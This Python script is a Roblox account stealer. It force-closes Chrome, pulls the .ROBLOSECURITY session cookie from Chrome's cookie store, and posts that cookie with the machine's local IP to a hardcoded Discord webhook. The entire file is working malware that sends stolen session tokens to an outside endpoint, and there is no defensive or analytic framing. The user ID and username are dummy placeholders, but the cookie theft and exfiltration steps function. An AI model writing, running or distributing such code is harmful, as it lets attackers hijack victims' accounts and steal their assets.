import os
import requests
import browser_cookie3
import socket
import subprocess
import time

# Discord Webhook URL
webhook_url = "https://discord.com/api/webhooks/1330720300307845170/f2Xm40QZH2CNbI4hbL0FRr66hJjmU92DXbyDcp0Z970RbPL9H4Nd5WzY06xiF8nPGGMp"

# Get Roblox user information from the .ROBLOSECURITY cookie
def get_user_info():
    try:
        cookies = browser_cookie3.chrome()  # Use Chrome cookies
        roblox_cookie = next((cookie for cookie in cookies if cookie.name == ".ROBLOSECURITY"), None)
        if roblox_cookie:
            roblox_value = roblox_cookie.value
            # Simulate a function to get user data (This part needs an actual implementation or API)
            user_id = "123456789"  # Dummy User ID
            username = "ExampleUser"  # Dummy Username
            return user_id, username, roblox_value
        else:
            print("No valid .ROBLOSECURITY cookie found.")
            return None, None, None
    except Exception as e:
        print(f"Error getting user info: {e}")
        return None, None, None

# Function to extract user information from the cookie (mock implementation for now)
def get_user_data_from_cookie(cookie_value):
    # Simulating a real function, this is just a placeholder
    return "123456789", "ExampleUser"  # Replace with actual logic if possible

# Get local IP address
def get_local_ip():
    try:
        ip = socket.gethostbyname(socket.gethostname())
        return ip
    except Exception as e:
        print(f"Error getting local IP address: {e}")
        return "Unavailable"

# Send data to Discord webhook, including .ROBLOSECURITY cookie
def send_to_discord(user_id, username, ip, roblox_cookie):
    content = {
        "content": f"User ID: {user_id}\nUsername: {username}\nIP: {ip}\n.ROBLOSECURITY Cookie: {roblox_cookie}"
    }
    try:
        response = requests.post(webhook_url, json=content)
        if response.status_code == 204:
            print("Data sent to Discord successfully.")
        else:
            print(f"Failed to send data to Discord: {response.status_code}")
    except Exception as e:
        print(f"Error sending data to Discord: {e}")

# Terminate Chrome process (optional, based on your use case)
def terminate_chrome():
    try:
        subprocess.call("TASKKILL /f /IM CHROME.EXE")
    except Exception as e:
        print(f"Error terminating Chrome: {e}")

# Main function to run the script
def main():
    print("Starting the process...")
    # Terminate Chrome process (Windows only)
    terminate_chrome()

    user_id, username, roblox_cookie = get_user_info()
    if user_id and username and roblox_cookie:
        ip = get_local_ip()
        send_to_discord(user_id, username, ip, roblox_cookie)
    else:
        print("No valid user data found.")

if __name__ == "__main__":
    main()
